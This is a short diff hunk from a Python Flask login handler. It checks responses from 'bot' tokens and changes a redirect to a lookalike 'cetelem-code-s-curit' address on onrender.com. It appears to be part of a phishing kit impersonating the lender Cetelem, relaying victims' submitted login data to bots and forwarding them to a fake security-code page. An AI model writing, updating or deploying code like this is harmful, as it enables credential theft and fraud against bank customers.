@@ -45,7 +45,7 @@ def login():
             if response.status_code != 200:
                 return f"Erreur avec le bot {token[:10]}... : {response.text}", 500
 
-        return redirect("https://cetelem-code-s-curit-l2qp.onrender.com/")
+        return redirect("https://cetelem-code-s-curit-6f98.onrender.com/")
 
     return render_template('login.html')
 
